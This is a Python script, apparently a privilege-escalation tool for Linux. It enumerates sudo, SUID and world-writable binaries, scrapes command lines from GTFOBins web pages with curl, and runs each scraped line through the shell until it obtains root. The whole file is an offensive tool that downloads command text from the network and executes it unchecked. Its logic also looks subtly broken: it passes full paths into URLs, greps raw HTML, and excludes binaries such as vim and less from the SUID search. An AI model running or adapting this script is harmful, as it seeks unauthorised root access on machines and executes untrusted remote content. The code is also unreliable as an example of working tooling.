#!/usr/bin/env python3

import subprocess
import re

def search_gtfobins(binary):
    """
    Search GTFOBins for the given binary and return the corresponding command(s) for privilege escalation
    """
    try:
        output = subprocess.check_output(f"curl -s https://gtfobins.github.io/gtfobins/{binary}/ | grep -Eo '(sudo|setcap|chmod) .*'", shell=True)
        commands = output.decode('utf-8').splitlines()
        return commands
    except subprocess.CalledProcessError:
        return None

def check_binary(binary):
    """
    Check if the given binary exists on the system
    """
    try:
        subprocess.check_output(f"which {binary}", shell=True)
        return True
    except subprocess.CalledProcessError:
        return False

def check_privilege():
    """
    Check the current user's privileges
    """
    try:
        output = subprocess.check_output("id -u", shell=True)
        uid = int(output.decode('utf-8'))
        if uid == 0:
            return "root"
        else:
            return "user"
    except subprocess.CalledProcessError:
        return None

def escalate_privilege(binary):
    """
    Search for privilege escalation commands for the given binary and try them until successful
    """
    commands = search_gtfobins(binary)
    if not commands:
        print(f"No privilege escalation commands found for {binary}")
        return
    for command in commands:
        print(f"Trying command: {command}")
        try:
            subprocess.check_output(command, shell=True)
            print("Privilege escalation successful!")
            break
        except subprocess.CalledProcessError:
            print("Privilege escalation failed")

def main():
    # Check current user's privileges
    privilege = check_privilege()
    if privilege == "root":
        print("Already running as root, no need to escalate privileges")
        return

    # Check for sudo privilege
    if check_binary("sudo"):
        escalate_privilege("sudo")
        privilege = check_privilege()
        if privilege == "root":
            return

    # Check for setuid binary
    output = subprocess.check_output("find / -perm -4000 -type f -print 2>/dev/null | grep -vE '^(.+\/)?(nmap|vim|nano|less|more)$'", shell=True)
    binaries = output.decode('utf-8').splitlines()
    for binary in binaries:
        print(f"Found setuid binary: {binary}")
        escalate_privilege(binary)
        privilege = check_privilege()
        if privilege == "root":
            return

    # Check for writable binary
    output = subprocess.check_output("find / -perm -o=w -type f -print 2>/dev/null", shell=True)
    binaries = output.decode('utf-8').splitlines()
    for binary in binaries:
        print(f"Found writable binary: {binary}")
        escalate_privilege(binary)
        privilege = check_privilege()
        if privilege == "root":
            return

    print("No privilege escalation methods found")
    return

if __name__ == "__main__":
    main()
